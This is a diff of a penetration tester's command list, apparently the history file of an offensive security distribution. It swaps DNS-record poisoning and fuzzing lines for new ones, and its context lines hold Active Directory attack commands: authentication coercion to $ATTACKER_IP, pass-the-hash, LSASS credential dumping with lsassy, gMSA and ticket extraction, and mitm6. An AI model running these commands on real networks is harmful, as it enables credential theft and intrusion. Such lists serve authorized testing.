@@ -73,12 +73,6 @@ dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
 dirb http://192.168.10.10 /usr/share/seclists/Discovery/Web-Content/big.txt
 dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://$TARGET/"
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action add --data "$ATTACKER_IP" "$DC_HOST"
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" --action add "$DC_HOST"
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -r "EXEGOL-01.$DOMAIN" -d 192.168.56.1 --action query "$DC_HOST"
-dnstool.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" --action add "$DC_HOST"
-echo "http://$TARGET/" | hakrawler -d 10
 enum4linux -A "$IP"
 enum4linux-ng -A "$TARGET"
 enum4linux-ng -A -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
@@ -93,17 +87,11 @@ export NAME=
 export TARGET=
 export USER=
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip
-ffuf -c -t 5 -rate 20 -p 0.2 -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc all -w $HOME/.wordlists/common.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 20 -p 0.2 -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc all -w $HOME/.wordlists/api.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 20 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc all -w $HOME/.wordlists/dir-list.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 20 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc all -w $HOME/.wordlists/raft-small.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 20 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc all -w $HOME/.wordlists/api-wild.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 20 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc all -w $HOME/.wordlists/fuzz-1.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 20 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc all -w $HOME/.wordlists/LFI.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 20 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -ac -mc 200,503,500,400 -w $HOME/.wordlists/SQL.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 5 -rate 30 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -H "Host:FUZZ.$DOMAIN" -mc 200,403 -w $HOME/.wordlists/dns.txt -u http://$DOMAIN/
-ffuf -c -t 5 -rate 30 -p 0.2  -H "User: $CTF_HEADER" -H "User-Agent: $AGENT" -H "Host:FUZZ.$DOMAIN" -mc 200,403 -w $HOME/.wordlists/dns-1.txt -u http://$DOMAIN/
-ffuf -request REQUESTFILE -request-proto http  -H "User: $CTF_HEADER" -w PATH/TO/WORDLIST -fs 0 -c
+ffuf -c -t 5 -rate 20 -p 0.2  -H "User-Agent: $AGENT" -ac -mc all -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$DOMAIN/FUZZ
+ffuf -c -t 5 -rate 20 -p 0.2  -H "User-Agent: $AGENT" -ac -mc all -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt -u http://$DOMAIN/FUZZ
+ffuf -c -t 5 -rate 30 -p 0.2  -H "User-Agent: $AGENT" -H "Host:FUZZ.$DOMAIN" -mc 200,403,401 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$DOMAIN/
+ffuf -c -t 5 -rate 30 -p 0.2  -H "User-Agent: $AGENT" -H "Host:FUZZ.$DOMAIN" -mc 200,403,401 -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://$DOMAIN/
+ffuf -request REQUESTFILE -request-proto http -w PATH/TO/WORDLIST -fs 0 -c
 find DIR -type f -newermt YYYY-MM-DD ! -newermt YYYY-MM-DD > /dev/null
 gMSADumper.py -d "$DOMAIN" -l "$DC_HOST" -u "$USER" -p "$PASSWORD"
 getST.py -k -no-pass -spn host/"$DC_HOST" "$DOMAIN"/"$USER"
@@ -147,7 +135,6 @@ logfile $TARGET
 lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST" 0
 lsassy -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
 lsassy -v -u "$USER" -H "$NT_HASH" -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
-maigret "username"
 masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
 mitm6 --interface eth0
